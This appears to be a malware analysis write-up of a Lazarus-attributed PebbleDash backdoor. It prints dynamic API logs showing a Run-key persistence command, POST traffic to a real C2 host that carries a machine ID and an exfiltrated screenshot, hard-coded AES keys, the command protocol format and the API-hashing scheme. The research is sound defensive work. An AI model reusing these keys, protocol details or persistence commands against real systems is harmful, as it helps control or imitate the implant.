---
title: "LAZARUS PebbleDash"
date: 2025-03-10
---

## Context

SHA256 : 875b0cbad25e04a255b13f86ba361b58453b6f3c5cc11aca2db573c656e64e24  
sample source : [bazar.abuse.ch](https://bazaar.abuse.ch/sample/875b0cbad25e04a255b13f86ba361b58453b6f3c5cc11aca2db573c656e64e24/)  
VT : [VirusTotal](https://www.virustotal.com/gui/file/875b0cbad25e04a255b13f86ba361b58453b6f3c5cc11aca2db573c656e64e24)  

Reports:  
<https://dmpdump.github.io/posts/Lazarus-Backdoor-ITLure/>  
<https://ti.qianxin.com/blog/articles/Kimsuky-Weapon-Update:-Analysis-of-Attack-Activity-Targeting-Korean-Region/>  


C2 :
http://www.addfriend.kr/board/userfiles/temp/index.html  

Analyzed sample is a 64bit PE PebbleDash sample attributed to LAZARUS  

As usual, results from dynamic analysis are shared in my repository ([logs](https://github.com/cedricg-mirror/reflexions/blob/main/APT/LAZARUS/PebbleDash/875b0cbad25e04a255b13f86ba361b58453b6f3c5cc11aca2db573c656e64e24/logs.txt))  



---
## Persistency  

In order to trigger the persistency-setup behavior from the sample a little reverse engineering was required :  

```html
[CNT] [13]
[PTP] [0x968] [0xbb8] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <GetCommandLineA> in [KERNEL32.DLL] 
[RET] 0x7ff7f099fd96 in [pebbledash.exe]

[CNT] [14]
[PTP] [0x968] [0xbb8] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <GetCommandLineW> in [KERNEL32.DLL] 
[RET] 0x7ff7f099fda3 in [pebbledash.exe]
```

Following the results from those call in statical analysis revealed the following :  

![Command Line Parsing](/docs/assets/images/PebbleDash/start.jpg)

The sample was therefore run with the '--start' parameter, which triggered its installation :  

```html
[CNT] [64]
[PTP] [0x968] [0xbb8] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <CreateProcessW> in [KERNEL32.DLL] 
[PAR] LPCWSTR               lpApplicationName   : 0x0 (null)
[PAR] LPCWSTR               lpCommandLine       : 0x00000025275BF1E0
[STR]                       -> "reg add hkcu\software\microsoft\windows\currentversion\run /d "\"C:\Users\user\Desktop\pebbledash\pebbledash.exe\"" /t R"
[STR]                          "EG_SZ /v "PAY" /f"
[PAR] LPSECURITY_ATTRIBUTES lpProcessAttributes : 0x0
[PAR] LPSECURITY_ATTRIBUTES lpThreadAttributes  : 0x0
[PAR] BOOL                  bInheritHandles     : 0x0
[PAR] DWORD                 dwCreationFlags     : 0x0 
[PAR] LPVOID                lpEnvironment        : 0x0
[PAR] LPCWSTR               lpCurrentDirectory   : 0x0 (null)
[PAR] LPSTARTUPINFOW        lpStartupInfo        : 0x00000025275BE970
[FLD]                       -> lpDesktop   = 0x0 (null)
[FLD]                       -> lpTitle     = 0x0 (null)
[FLD]                       -> dwFlags     = 0x1 (STARTF_USESHOWWINDOW)
[FLD]                       -> wShowWindow = 0x0
[FLD]                       -> hStdInput   = 0x0
[FLD]                       -> hStdOutput  = 0x0
[FLD]                       -> hStdError   = 0x0
[PAR] LPPROCESS_INFORMATION lpProcessInformation : 0x00000025275BE950
[RET] 0x7ff7f0997314 in [pebbledash.exe]
```

---
## C2 connection

C2 connection is straightforward :  

```html
[CNT] [91]
[PTP] [0x968] [0xbb8] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <WinHttpConnect> in [winhttp.dll] 
[PAR] HINTERNET     hSession       : 0x277edf80
[PAR] LPCWSTR       pswzServerName : 0x00000025275BD040
[STR]               -> "www.addfriend.kr"
[PAR] INTERNET_PORT nServerPort    : 80
[RET] 0x7ff7f0985d45 in [pebbledash.exe]

[CNT] [92]
[PTP] [0x968] [0xbb8] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <WinHttpOpenRequest> in [winhttp.dll] 
[PAR] HINTERNET hConnect          : 0x277f0070
[PAR] LPCWSTR   pwszVerb          : 0x00000025275BD022
[STR]           -> "POST"
[PAR] LPCWSTR   pwszObjectName    : 0x00000025275BD250
[STR]           -> "/board/userfiles/temp/index.html"
[PAR] LPCWSTR   pwszVersion       : 0x0 (null)
[PAR] LPCWSTR   pwszReferrer      : 0x0 (null)
[PAR] LPCWSTR   *ppwszAcceptTypes : 0x0
[PAR] DWORD     dwFlags           : 0x0 
[RET] 0x7ff7f0985e41 in [pebbledash.exe]

[...]

[CNT] [103]
[PTP] [0x968] [0xbb8] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <WinHttpWriteData> in [winhttp.dll] 
[PAR] HINTERNET hRequest                 : 0x00000025277F4080
[PAR] LPCVOID   lpBuffer                 : 0x00000025275BE180
[STR]           -> "sep=MltZfhPlOLa&uid=689b5bb9&sid=0101e418"
[PAR] DWORD     dwNumberOfBytesToWrite   : 0x29
[PAR] LPDWORD   lpdwNumberOfBytesWritten : 0x00000025275BDE38
[RET] 0x7ff7f0986c47 in [pebbledash.exe]

[CNT] [104]
[PTP] [0x968] [0xbb8] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <WinHttpReceiveResponse> in [winhttp.dll] 
[PAR] HINTERNET hRequest   : 0x00000025277F4080
[PAR] LPVOID    lpReserved : 0x0
[RET] 0x7ff7f0986daa in [pebbledash.exe]
```

As mention in a linked blog analysis from dmpdump.github, the "uid" parameter is set according to the result from :  

```html
[CNT] [81]
[PTP] [0x968] [0xbb8] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <GetVolumeInformationW> in [KERNEL32.DLL] 
[PAR] LPCWSTR lpRootPathName           : 0x00000025275BDCB0
[STR]         -> "C:\"
[PAR] LPWSTR  lpVolumeNameBuffer       : 0x0
[PAR] DWORD   nVolumeNameSize          : 0x0
[PAR] LPDWORD lpVolumeSerialNumber     : 0x00000025275BDCA8
[PAR] LPDWORD lpMaximumComponentLength : 0x0
[PAR] LPDWORD lpFileSystemFlags        : 0x0
[PAR] LPWSTR  lpFileSystemNameBuffer   : 0x0
[PAR] DWORD   nFileSystemNameSize      : 0x0
[RET] 0x7ff7f098ab33 in [pebbledash.exe]
```

---
## Encryption

AES encryption is achieved by the following routine :  

![AES Encrypt](/docs/assets/images/PebbleDash/aes.jpg)

PebbleDash relies on AES-CBC-128 with an IV set to 0 for its encryption layer  

The AES key is unxored just before the AES_Init call : "aqjNWSmPkmpYnZJT"    

Interestingly, another AES Key "NjqaPmSWYpmkTJZn" can also be used under circumstances that I have yet to understand  



---
## PebbleDash Commands
  
  
I'm still in the process of rewriting a basic C2 for this sample, so far I can share some dynamic analysis log for the following commands :  

# CMD_ID 0x03 Set Current Directory

```html
[CNT] [364]
[PTP] [0x22c] [0x664] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <WinHttpReadData> in [winhttp.dll] 
[PAR] HINTERNET hRequest              : 0xff3cd9c0
[PAR] LPVOID    lpBuffer              : 0x000000A2FF401B10
[PAR] DWORD     dwNumberOfBytesToRead : 0x46
[PAR] LPDWORD   lpdwNumberOfBytesRead : 0x000000A2FF19D33C
[RET] [0x7ff7a37d6fa4] [+0x6fa4] in [pebbledash.exe]

[ * ] [pid 0x22c][tid 0x664] c:\users\user\desktop\pebbledash\pebbledash.exe
[API] <WinHttpReadData>
[PAR] LPCVOID lpBuffer : 0x000000A2FF401B10
[STR]         -> "<html>59hmGTXPezZN8QoJ2v03xUJjESmUHo1Nw1M55KXGg0P+7KeqIKOzaj9m6H+aiUCf"
[RES] BOOL 0x1
```

After Base64Decode and AES Decrypt, the layout of the command is :  

```
00000000  03 00 00 00 00 00 00 00 43 00 3a 00 5c 00 55 00  |........C.:.\.U.|
00000010  73 00 65 00 72 00 73 00 5c 00 75 00 73 00 65 00  |s.e.r.s.\.u.s.e.|
00000020  72 00 00 00                                      |r...|
```

First 8 bytes is the command ID (0x3 for SetCurrentDirectory), then the parameter (the path to the new Current Directory)  
Path has to be set in UTF-16LE  

PebbleDash handles this command this way :  

```html
[CNT] [373]
[PTP] [0x22c] [0x664] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <StrTrimW> in [SHLWAPI.dll] 
[PAR] PWSTR  psz          : 0x000000A2FF19D020
[STR]        -> "C:\Users\user"
[PAR] PCWSTR pszTrimChars : 0x00007FF7A3808054
[STR]        -> "\ "
[RET] [0x7ff7a37de70d] [+0xe70d] in [pebbledash.exe]

[CNT] [375]
[PTP] [0x22c] [0x664] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <SetCurrentDirectoryW> in [KERNEL32.DLL] 
[PAR] LPCWSTR lpPathName : 0x000000A2FF19D020
[STR]         -> "C:\Users\user\"
[RET] [0x7ff7a37de826] [+0xe826] in [pebbledash.exe]

[CNT] [377]
[PTP] [0x22c] [0x664] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <GetCurrentDirectoryW> in [KERNEL32.DLL] 
[PAR] DWORD  nBufferLength : 0x400
[PAR] LPWSTR lpBuffer      : 0x000000A2FF19D020
[RET] [0x7ff7a37de8ab] [+0xe8ab] in [pebbledash.exe]

[CNT] [394]
[PTP] [0x22c] [0x664] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <WinHttpWriteData> in [winhttp.dll] 
[PAR] HINTERNET hRequest                 : 0x000000A2FF3CD9C0
[PAR] LPCVOID   lpBuffer                 : 0x000000A2FF41BCC0
[STR]           -> "sep=sRhqotvThSV&sid=013efbc9&data=RDMUOWovjIpPR5Erhn4rhFOn8dSttvdYfSrSJBryHVaAn09y8gL2iOBOckjVd4nr"
[PAR] DWORD     dwNumberOfBytesToWrite   : 0x62
[PAR] LPDWORD   lpdwNumberOfBytesWritten : 0x000000A2FF19CC68
[RET] [0x7ff7a37d6c47] [+0x6c47] in [pebbledash.exe]

```

The data parameter is the feedback from the command execution :  

```
00000000  02 00 00 00 1c 00 00 00 43 00 3a 00 5c 00 55 00  |........C.:.\.U.|
00000010  73 00 65 00 72 00 73 00 5c 00 75 00 73 00 65 00  |s.e.r.s.\.u.s.e.|
00000020  72 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |r...............|
```

First ULONG (0x2) is unknown yet (very likely SUCCESS), 2nd ULONG (0x1c) is the size of the following data, in this case the new Current Directory  

# CMD_ID 0x10 ScreenShot

```html
[CNT] [765]
[PTP] [0x22c] [0x664] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <WinHttpReadData> in [winhttp.dll] 
[PAR] HINTERNET hRequest              : 0xff421680
[PAR] LPVOID    lpBuffer              : 0x000000A2FF402CF0
[PAR] DWORD     dwNumberOfBytesToRead : 0x1e
[PAR] LPDWORD   lpdwNumberOfBytesRead : 0x000000A2FF19D33C
[RET] [0x7ff7a37d6fa4] [+0x6fa4] in [pebbledash.exe]

[ * ] [pid 0x22c][tid 0x664] c:\users\user\desktop\pebbledash\pebbledash.exe
[API] <WinHttpReadData>
[PAR] LPCVOID lpBuffer : 0x000000A2FF402CF0
[STR]         -> "<html>AKLC+sckv4iHL/2xyXcxyQ=="
[RES] BOOL 0x1
```

After Base64Decode and AES Decrypt, the layout of the command is :  

```
00000000  10 00 00 00 00 00 00 00                          |........|
```

First 8 bytes is the command ID (0x10 for Take a ScreenShot), no parameter is expected   

PebbleDash handles this command this way :  

Reserve a Temp file name with the 'PMS' prefix :  

```html
[CNT] [576]
[PTP] [0x280] [0x858] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <GetTempFileNameW> in [KERNEL32.DLL] 
[PAR] LPCWSTR lpPathName     : 0x00007FF6BAF5FE30
[STR]         -> "C:\Users\user\AppData\Local\Temp\"
[PAR] LPCWSTR lpPrefixString : 0x0000006040D1D082
[STR]         -> "PMS"
[PAR] UINT    uUnique        : 0x0
[PAR] LPWSTR  lpTempFileName : 0x0000006040D1D0A0
[RET] [0x7ff6baf2d850] [+0xd850] in [pebbledash.exe]

[CNT] [578]
[PTP] [0x280] [0x858] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <DeleteFileW> in [KERNEL32.DLL] 
[PAR] LPCWSTR lpFileName : 0x0000006040D1D0A0
[STR]         -> "C:\Users\user\AppData\Local\Temp\PMSEE98.tmp"
[RET] [0x7ff6baf2d8c6] [+0xd8c6] in [pebbledash.exe]
```

Take a screenshot through usual GDI32 API :  

```html
[CNT] [580]
[PTP] [0x280] [0x858] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <GetDC> in [USER32.dll] 
[PAR] HWND   hWnd  : 0x0
[RET] [0x7ff6baf299f3] [+0x99f3] in [pebbledash.exe]

[CNT] [582]
[PTP] [0x280] [0x858] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <CreateCompatibleDC> in [GDI32.dll] 
[RET] [0x7ff6baf29ab4] [+0x9ab4] in [pebbledash.exe]

[CNT] [584]
[PTP] [0x280] [0x858] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <GetSystemMetrics> in [USER32.dll] 
[PAR] int nIndex : 76 (SM_XVIRTUALSCREEN)
[RET] [0x7ff6baf29b66] [+0x9b66] in [pebbledash.exe]

[CNT] [585]
[PTP] [0x280] [0x858] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <GetSystemMetrics> in [USER32.dll] 
[PAR] int nIndex : 77 (SM_YVIRTUALSCREEN)
[RET] [0x7ff6baf29be6] [+0x9be6] in [pebbledash.exe]

[CNT] [586]
[PTP] [0x280] [0x858] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <GetSystemMetrics> in [USER32.dll] 
[PAR] int nIndex : 78 (SM_CXVIRTUALSCREEN)
[RET] [0x7ff6baf29c86] [+0x9c86] in [pebbledash.exe]

[CNT] [587]
[PTP] [0x280] [0x858] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <GetSystemMetrics> in [USER32.dll] 
[PAR] int nIndex : 79 (SM_CYVIRTUALSCREEN)
[RET] [0x7ff6baf29d66] [+0x9d66] in [pebbledash.exe]

[CNT] [589]
[PTP] [0x280] [0x858] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <CreateCompatibleBitmap> in [GDI32.dll] 
[PAR] HDC hdc : 0xFFFFFFFF8B0106EE
[PAR] int cx  : 0x5eb
[PAR] int cy  : 0x3fc
[RET] [0x7ff6baf29e9e] [+0x9e9e] in [pebbledash.exe]

[CNT] [591]
[PTP] [0x280] [0x858] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <SelectObject> in [GDI32.dll] 
[PAR] HDC     hdc : 0x9010b60
[PAR] HGDIOBJ h   : 0x7050b61
[RET] [0x7ff6baf29fbf] [+0x9fbf] in [pebbledash.exe]

[CNT] [593]
[PTP] [0x280] [0x858] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <BitBlt> in [GDI32.dll] 
[PAR] HDC hdc    : 0x9010b60
[PAR] int x      : 0x0
[PAR] int y      : 0x0
[PAR] int cx     : 0x5eb
[PAR] int cy     : 0x3fc
[PAR] HDC hdcSrc : 0xFFFFFFFF8B0106EE
[PAR] int x1     : 0x0
[PAR] int y1     : 0x0
[PAR] int rop    : 0xcc0020
[RET] [0x7ff6baf2a0b6] [+0xa0b6] in [pebbledash.exe]

[CNT] [595]
[PTP] [0x280] [0x858] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <GetObjectW> in [GDI32.dll] 
[PAR] HANDLE h  : 0x7050b61
[PAR] int c     : 0x20
[PAR] LPVOID pv : 0x0000006040D1D008
[RET] [0x7ff6baf2a150] [+0xa150] in [pebbledash.exe]

[CNT] [599]
[PTP] [0x280] [0x858] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <GetDIBits> in [GDI32.dll] 
[PAR] HDC     hdc    : 0xFFFFFFFF8B0106EE
[PAR] HBITMAP hbm    : 0x7050b61
[PAR] int     start  : 0x0
[PAR] int     clines : 0x3fc
[RET] [0x7ff6baf2a2b3] [+0xa2b3] in [pebbledash.exe]
```

The screenshot is then saved unencrypted to the TMP file :  

```html
[CNT] [601]
[PTP] [0x280] [0x858] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <CreateFileW> in [KERNEL32.DLL] 
[PAR] LPCWSTR lpFileName            : 0x0000006040D1D0A0
[STR]         -> "C:\Users\user\AppData\Local\Temp\PMSEE98.tmp"
[PAR] DWORD   dwDesiredAccess       : 0x40000000 (GENERIC_WRITE)
[PAR] DWORD   dwCreationDisposition : 0x2 (CREATE_ALWAYS)
[RET] [0x7ff6baf2a3f6] [+0xa3f6] in [pebbledash.exe]

[CNT] [603]
[PTP] [0x280] [0x858] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <WriteFile> in [KERNEL32.DLL] 
[PAR] HANDLE       hFile                  : 0x1f8
[PAR] LPVOID       lpBuffer               : 0x0000006043D8C040
[PAR] DWORD        nNumberOfBytesToWrite  : 0x156a5
[PAR] LPDWORD      lpNumberOfBytesWritten : 0x0000006040D1CFD0
[PAR] LPOVERLAPPED lpOverlapped           : 0x0
[RET] [0x7ff6baf2a507] [+0xa507] in [pebbledash.exe]

```

The file is then read, encrypted, base64 encoded and sent to the C2 :  

```html
[CNT] [613]
[PTP] [0x280] [0x858] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <CreateFileW> in [KERNEL32.DLL] 
[PAR] LPCWSTR lpFileName            : 0x0000006040D1C820
[STR]         -> "C:\Users\user\AppData\Local\Temp\PMSEE98.tmp"
[PAR] DWORD   dwDesiredAccess       : 0x80000000 (GENERIC_READ)
[PAR] DWORD   dwCreationDisposition : 0x3 (OPEN_EXISTING)
[RET] [0x7ff6baf2f787] [+0xf787] in [pebbledash.exe]

[CNT] [615]
[PTP] [0x280] [0x858] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <GetFileSize> in [KERNEL32.DLL] 
[PAR] HANDLE hFile : 0x1f8
[RET] [0x7ff6baf2f8d6] [+0xf8d6] in [pebbledash.exe]

[CNT] [618]
[PTP] [0x280] [0x858] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <ReadFile> in [KERNEL32.DLL] 
[PAR] HANDLE hFile                : 0x1f8
[PAR] LPVOID lpBuffer             : 0x0000006040E4A160
[PAR] DWORD  nNumberOfBytesToRead : 0x156a5
[RET] [0x7ff6baf2f9c4] [+0xf9c4] in [pebbledash.exe]

[CNT] [633]
[PTP] [0x280] [0x858] [c:\users\user\desktop\pebbledash\pebbledash.exe]
[API] <WinHttpWriteData> in [winhttp.dll] 
[PAR] HINTERNET hRequest                 : 0x0000006040DFD9C0
[PAR] LPCVOID   lpBuffer                 : 0x0000006040E917E0
[STR]           -> "sep=sRhqotvThSV&sid=01a7561f&data=KfH4HnlItjUjNYejIRnLcK1AqJfoC0g6BPGl+CO0CE9GZOtx+J9e4hdI3hrrOLK+TKhyStgbkexhmmG1w8ul3o"
[STR]              "4M/tVXPkLvB1VGt0BBLmzAseZfdQuKKjvrC4n34RE5ru18h04gtiwPqgOvJApLDkE9x0zQCdxn2FDq0kjIHRKvl30IlzC76+vcqInhLF1IUTFNZNDXO4aQw3"
[STR]              "B5+/QcVpktH6wVlG10TjrZQKQ/jSP3UjEsUIC+n1DDxCHYf0X7JMsJkq82eXK64sZbkuT2FkwTuKrTquQ+NAOsHB1fqtwDBwPeG0R56Ddw13fpF2gp3Aj5ed"
[STR]              "THup8pDYWHjbOhj4cI7kkTTp6nXxch7kk6FafqYQr96XQR2KkV5UMEqdY6dbCad/GZgcBBLoqmMqL3slAgBoyDg19a5Pp+lSAnUMlkZJiveaWLmvFQGtx/qC"
[STR]              "U7vEz8X6QujrhHW4zJ2r0QQ3SEfSwsEmIprAmAB1Z45jqmohN7KWxAoum2B+4bTrg4+WqdFajID7x3IspO22EW2c7/DOo401bzF1p7AIsAid7IxnKpBYVwrs"
[STR]              "jWtqSNat+yf/Rq1wDSxvaD7wE1Ybc9Tf+Vd9LVfCfeJhWBE7Xkv+T83sfRmOjQ5E1hIFDofU6ApXza4iq+J21UyXYBoJpsCcImRz/9rBMTeqzG16+Y+gsjpo"
[STR]              "gGYhxD6gJ2FMT8a5u3CjoVJUz0fukIs8jphwCZOrdASntBQiTcSPTQP58jqRMxi0I4HNojtqjdpV+ocOeqceahUr9OpmgbG5BuidXL4LFsH2ET/Jz7/uJfq+"
[STR]              "9GOr/TI2c7D5yF/aPZTmyXhyk+HMhmnsubZbsnXSGXFzuQJnjkvQThYoU8yph22mvPMEhrVN1l3VCB9sIpH5NgEDlKGWOZkyfkyIqyDDs+h+tjtrKWpzm8gy"
[STR]              "Yg2Wvxmf1assyQQHP94ge+hwCWPWFZjIC26tJHwVphhqw6BJw+Q/uS1G3RYNtNQezP8p+1IDGJ49RGdfUQQYrNA0myKkXhz27fHLvE/emitfc9aRLsr+4mFd"
[STR]              "LSc7sVTpEs4UBS3gsHiWxPRCdh1LAYlkxjduSgOaj3KTK9l5fxN+Bxm63vpVkYQx1jlafX8eed6/1WGEXLKiK7Fgq3o1O1lzyuthwCIiJHh0vFtoosr/cmOb"
[STR]              "lbTeXKlTCAoSI77v6in/vjXRWb+40y0l2ItZrr+ByM92m9IEvYcx6vXUyazICqppiHrMbymuVDemlYCTzvJvRMKdLxK8nvx4yShxSj7kIYYRCOaeL3wayoit"
[STR]              "AyTgpUzD69KwBDrUdC9EZTXWjtZRQAgmvmbQwdmSbpj1HX8i24hywegTKRjPZikD8y9TKl+02AuLgQKKG+/R9m8v0u7HBsyQpOB6newjxcwzM6Z8kLn8qh6n"
[STR]              "kBYUUcTg2eyNhX71KULLNL5mYGKG9EBpSV9d9/v/IaiLZ5xEy1kZTIn0c/t7ahSE0LEJrUD1/xd40ogTCN4dLeAfU8RzsIixR9Xh1/47xSnIuMedMZ/IMxll"
[STR]              "0Okj8Vtod4rGW3viN198K5vLc7g/IGByYyC3qYA6OYXbtQ4pdfkKSfWRSvfVpK8kpEuSU0gPkkXHC99Du++anskgkG+CWGMMjQEm0vAhdaZBlgZBTU9ZpzAQ"
[STR]              [TRUNCATED]
[PAR] DWORD     dwNumberOfBytesToWrite   : 0x10000
[PAR] LPDWORD   lpdwNumberOfBytesWritten : 0x0000006040D1C458
[RET] [0x7ff6baf26c47] [+0x6c47] in [pebbledash.exe]
```

Which gives after decryption :  

```
00000000  02 00 00 00 a5 56 01 00 ff d8 ff e0 00 10 4a 46  |....¥V..ÿØÿà..JF|
00000010  49 46 00 01 01 01 01 2c 01 2c 00 00 ff db 00 43  |IF.....,.,..ÿÛ.C|
00000020  00 1b 12 14 17 14 11 1b 17 16 17 1e 1c 1b 20 28  |.............. (|
00000030  42 2b 28 25 25 28 51 3a 3d 30 42 60 55 65 64 5f  |B+(%%(Q:=0B`Ued_|
00000040  55 5d 5b 6a 78 99 81 6a 71 90 73 5b 5d 85 b5 86  |U][jx..jq.s[].µ.|
00000050  90 9e a3 ab ad ab 67 80 bc c9 ba a6 c7 99 a8 ab  |..£«.«g.¼Éº¦Ç.¨«|
00000060  a4 ff db 00 43 01 1c 1e 1e 28 23 28 4e 2b 2b 4e  |¤ÿÛ.C....(#(N++N|
00000070  a4 6e 5d 6e a4 a4 a4 a4 a4 a4 a4 a4 a4 a4 a4 a4  |¤n]n¤¤¤¤¤¤¤¤¤¤¤¤|
00000080  a4 a4 a4 a4 a4 a4 a4 a4 a4 a4 a4 a4 a4 a4 a4 a4  |¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤|
00000090  a4 a4 a4 a4 a4 a4 a4 a4 a4 a4 a4 a4 a4 a4 a4 a4  |¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤¤|
000000a0  a4 a4 a4 a4 a4 a4 ff c0 00 11 08 03 fc 05 eb 03  |¤¤¤¤¤¤ÿÀ....ü.ë.|
```

First ULONG (0x2) is unknown yet (very likely SUCCESS), 2nd ULONG (0x000156a5) is the size of the following data, in this case the JPG.   

---
## API Call

API call is achieved is most cases by going through the following pattern :  

![Dynamic API Address resolution](/docs/assets/images/PebbleDash/API_Call.jpg)

1) Required function name is hashed with Fowler–Noll–Vo hash function  
<https://en.wikipedia.org/wiki/Fowler%E2%80%93Noll%E2%80%93Vo_hash_function>  
The FNV_offset_basis is the 64-bit value: 0xcbf29ce484222325.  
The FNV_prime is the 64-bit value 0x100000001b3.  

2) Function address is dynamically retrieved by walking the PEB and looking for an exported function matching the given Hash  

3) Calling the function  

Few examples of hashed function names below :  

```
2cd62eda1e190cc8  
winhttp!WinHttpWriteData

bcfc93e92c75c701
WinHTTP!WinHttpReceiveResponse

200cc715113de71d  
KERNEL32!LocalAlloc

ddd409e63a9cb926
WinHTTP!WinHttpQueryDataAvailable

90fc86b9e2232aa9  
WinHTTP!WinHttpReadData

3cf811a64137c676
KERNEL32!LocalFree

ca455d40bfa3e279
WinHTTP!WinHttpCloseHandle
```


 

---  



